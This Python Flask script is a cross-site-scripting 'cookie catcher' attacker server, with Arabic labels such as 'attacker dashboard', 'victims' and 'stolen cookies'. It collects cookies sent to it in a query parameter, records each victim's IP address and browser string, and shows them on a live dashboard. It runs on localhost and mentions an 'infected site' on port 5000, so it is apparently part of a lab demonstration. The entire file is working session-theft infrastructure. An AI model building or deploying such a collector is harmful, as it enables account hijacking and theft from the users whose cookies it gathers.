from flask import Flask, request, render_template_string
from datetime import datetime
import urllib.parse

app = Flask(__name__)

logs = []

DASHBOARD = """
<!DOCTYPE html>
<html dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>XSS Catcher - لوحة المهاجم</title>
    <meta http-equiv="refresh" content="3">
    <style>
        body { 
            font-family: monospace; 
            background: #0d1117; 
            color: #58d68d; 
            padding: 20px;
            margin: 0;
        }
        h1 { 
            color: #ff4444; 
            border-bottom: 2px solid #ff4444;
            padding-bottom: 10px;
        }
        .stats {
            display: flex;
            gap: 20px;
            margin: 20px 0;
        }
        .stat-box {
            background: #161b22;
            border: 1px solid #30363d;
            padding: 15px 25px;
            border-radius: 8px;
        }
        .stat-box .num {
            font-size: 32px;
            color: #ff4444;
            font-weight: bold;
        }
        .stat-box .label {
            color: #8b949e;
            font-size: 12px;
        }
        table { 
            border-collapse: collapse; 
            width: 100%; 
            margin-top: 20px;
            background: #161b22;
            border-radius: 8px;
            overflow: hidden;
        }
        th, td { 
            border: 1px solid #30363d; 
            padding: 12px; 
            text-align: right;
        }
        th { 
            background: #21262d; 
            color: #58a6ff;
        }
        tr:nth-child(even) { background: #0d1117; }
        .cookie { 
            color: #ffd33d; 
            word-break: break-all;
            font-weight: bold;
        }
        .empty { 
            color: #8b949e; 
            text-align: center; 
            padding: 40px;
        }
        .status {
            display: inline-block;
            width: 10px;
            height: 10px;
            background: #58d68d;
            border-radius: 50%;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
    </style>
</head>
<body>
    <h1>🎯 XSS Catcher - لوحة المهاجم</h1>
    <p><span class="status"></span> السيرفر شغال — يستقبل على البورت 9000</p>
    
    <div class="stats">
        <div class="stat-box">
            <div class="num">{{ logs|length }}</div>
            <div class="label">عدد الضحايا</div>
        </div>
    </div>

    <table>
        <tr>
            <th>#</th>
            <th>الوقت</th>
            <th>IP الضحية</th>
            <th>الكوكيز المسروقة</th>
            <th>User-Agent</th>
        </tr>
        {% for log in logs %}
        <tr>
            <td>{{ loop.index }}</td>
            <td>{{ log.time }}</td>
            <td>{{ log.ip }}</td>
            <td class="cookie">{{ log.cookie }}</td>
            <td>{{ log.ua }}</td>
        </tr>
        {% endfor %}
        {% if not logs %}
        <tr><td colspan="5" class="empty">
            ⏳ لا توجد بيانات بعد...<br>
            <small>بانتظار الضحية تزور الموقع المصاب على البورت 5000</small>
        </td></tr>
        {% endif %}
    </table>
</body>
</html>
"""

@app.route('/')
def index():
    cookie = request.args.get('c', '')
    if cookie:
        decoded = urllib.parse.unquote(cookie)
        logs.append({
            'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'ip': request.remote_addr,
            'cookie': decoded,
            'ua': request.headers.get('User-Agent', '')[:80],
        })
        print(f"\n{'='*60}")
        print(f"[+] 🎯 استقبلنا كوكي جديدة!")
        print(f"[+] IP: {request.remote_addr}")
        print(f"[+] Cookies: {decoded}")
        print(f"{'='*60}\n")
        return '', 204
    return render_template_string(DASHBOARD, logs=logs)

@app.route('/<path:path>')
def catch_all(path):
    cookie = request.args.get('c', '')
    if cookie:
        decoded = urllib.parse.unquote(cookie)
        logs.append({
            'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'ip': request.remote_addr,
            'cookie': decoded,
            'ua': request.headers.get('User-Agent', '')[:80],
        })
        print(f"\n[+] 🎯 Cookie: {decoded}\n")
    return '', 204

if __name__ == '__main__':
    print("[*] 🎯 Attacker Server شغال على http://127.0.0.1:9000")
    print("[*] افتح المتصفح على http://127.0.0.1:9000 لمشاهدة اللوحة")
    app.run(host='127.0.0.1', port=9000, debug=False)
